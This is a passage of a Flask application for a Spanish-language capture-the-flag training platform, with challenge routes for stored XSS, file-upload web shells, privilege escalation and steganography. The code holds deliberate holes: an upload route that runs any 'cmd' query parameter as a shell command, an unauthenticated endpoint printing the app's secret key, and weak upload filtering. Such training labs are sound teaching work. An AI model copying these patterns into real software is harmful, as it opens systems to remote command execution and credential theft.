@play_required
def challenge_xss_stored():
    if request.method == 'POST':
        c = request.form.get('comment', '').strip()
        if c:
            STORED_COMMENTS.append({'user': session.get('username', 'ricitos'), 'text': c})
            flash('Recado publicado en el muro.', 'success')
        return redirect(url_for('challenge_xss_stored'))
    return render_template('challenges/xss_stored.html', ch=CH_BY_ID['xss_stored'],
                           comments=STORED_COMMENTS, hooked=None)

@app.route('/challenges/xss-stored/admin-bot', methods=['POST'])
@play_required
def xss_stored_bot():
    hooked = any('<script' in c['text'].lower() for c in STORED_COMMENTS)
    return render_template('challenges/xss_stored.html', ch=CH_BY_ID['xss_stored'],
                           comments=STORED_COMMENTS,
                           hooked={'ok': hooked,
                                   'flag': FLAGS['xss_stored'] if hooked else None})

# ══════════════════════════════════════════════════════
# FASE 3 · LAS HABITACIONES
# ══════════════════════════════════════════════════════

ALLOWED_EXT = {'png', 'jpg', 'jpeg', 'gif'}
MAGIC_BYTES = {'png': b'\x89PNG', 'jpg': b'\xff\xd8\xff', 'jpeg': b'\xff\xd8\xff', 'gif': b'GIF8'}

def allowed_file(filename, level):
    if level == 'low':
        return True
    ext = filename.rsplit('.', 1)[-1].lower() if '.' in filename else ''
    return ext in ALLOWED_EXT

@app.route('/challenges/webshell', methods=['GET', 'POST'])
@play_required
def challenge_webshell():
    level = session.get('level', 'low')
    upload_result = upload_url = upload_filename = None

    if request.method == 'POST':
        file = request.files.get('file')
        if not file or file.filename == '':
            flash('No seleccionaste ningún archivo.', 'warning')
        else:
            fname = secure_filename(file.filename)
            if not allowed_file(fname, level):
                upload_result = f'Tipo de archivo no permitido: {fname}'
            elif level == 'high':
                header = file.read(8); file.seek(0)
                ext = fname.rsplit('.', 1)[-1].lower()
                magic = MAGIC_BYTES.get(ext, b'')
                if magic and not header.startswith(magic):
                    upload_result = 'Archivo rechazado: magic bytes inválidos.'
                else:
                    file.save(os.path.join(UPLOAD_DIR, fname))
                    upload_filename = fname
                    upload_url = url_for('serve_upload', filename=fname, _external=True)
                    upload_result = 'ok'
            else:
                file.save(os.path.join(UPLOAD_DIR, fname))
                upload_filename = fname
                upload_url = url_for('serve_upload', filename=fname, _external=True)
                upload_result = 'ok'

    file_list = []
    for f in sorted(os.listdir(UPLOAD_DIR)):
        fp = os.path.join(UPLOAD_DIR, f)
        if os.path.isfile(fp):
            file_list.append({'name': f, 'size': f'{os.path.getsize(fp)} bytes',
                              'url': url_for('serve_upload', filename=f)})

    return render_template('challenges/webshell.html', ch=CH_BY_ID['webshell'],
                           level=level, upload_result=upload_result,
                           upload_url=upload_url, upload_filename=upload_filename,
                           file_list=file_list)

@app.route('/uploads/<filename>')
@play_required
def serve_upload(filename):
    fpath = os.path.join(UPLOAD_DIR, filename)
    if filename.endswith('.py') and os.path.exists(fpath):
        cmd = request.args.get('cmd', 'id')
        try:
            result = subprocess.getoutput(cmd)
            return app.response_class(
                f'<pre style="font-family:monospace;color:#39ff14;background:#000;'
                f'padding:1rem;border-radius:8px;">$ {cmd}\n{result}\n</pre>',
                mimetype='text/html')
        except Exception as e:
            return str(e), 500
    return send_from_directory(UPLOAD_DIR, filename)

@app.route('/challenges/metasploit')
@play_required
def challenge_metasploit():
    return render_template('challenges/metasploit.html', ch=CH_BY_ID['metasploit'])

@app.route('/challenges/privesc')
@play_required
def challenge_privesc():
    is_admin = session.get('role') == 'admin'
    return render_template('challenges/privesc.html', ch=CH_BY_ID['privesc'],
                           is_admin=is_admin, admin_flag=FLAGS['privesc'])

@app.route('/admin')
def admin_redirect():
    return redirect(url_for('challenge_privesc'))

@app.route('/admin/config')
def admin_config():
    return app.response_class(
        '# Configuración del servidor Goldilocks CTF\n'
        '# ⚠ No compartir — solo administradores\n'
        f'SECRET_KEY = {app.secret_key!r}\n'
        'ADMIN_USER = osopapa\n'
        'DB_PATH    = goldilocks.db\n',
        mimetype='text/plain')

@app.route('/challenges/stego')
@play_required
def challenge_stego():
    return render_template('challenges/stego.html', ch=CH_BY_ID['stego'])

@app.route('/challenges/stego/download')
@play_required
def download_stego():
    for name in ('cuadro_del_pasillo_con_flag.jpg', 'cuadro_del_pasillo_stego.jpg',
                 'cuadro_del_pasillo.png'):
        p = os.path.join(BASE_DIR, 'static', 'img', name)
        if os.path.exists(p):
            return send_file(p, as_attachment=True, download_name='cuadro_del_pasillo.jpg')
    flash('Imagen no encontrada. Ejecuta setup_db.py primero.', 'danger')
    return redirect(url_for('challenge_stego'))

# ──────────────────────────────────────────────────────
# Scoreboard
# ──────────────────────────────────────────────────────
@app.route('/scoreboard')
@play_required
def scoreboard():
    try:
        db = sqlite3.connect(DB_PATH)
        rows = db.execute(
            'SELECT s.username, COUNT(*) f, '
            '       MAX(0, SUM(s.pts) - COALESCE((SELECT SUM(h.pts) FROM hint_unlocks h '
            '                                     WHERE h.username = s.username), 0)) sc '
            'FROM scores s GROUP BY s.username ORDER BY sc DESC, f DESC').fetchall()
        db.close()
        board = [{'username': r[0], 'flags': r[1], 'score': r[2]} for r in rows]
    except Exception:
        board = []
    return render_template('scoreboard.html', board=board)

# ──────────────────────────────────────────────────────
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
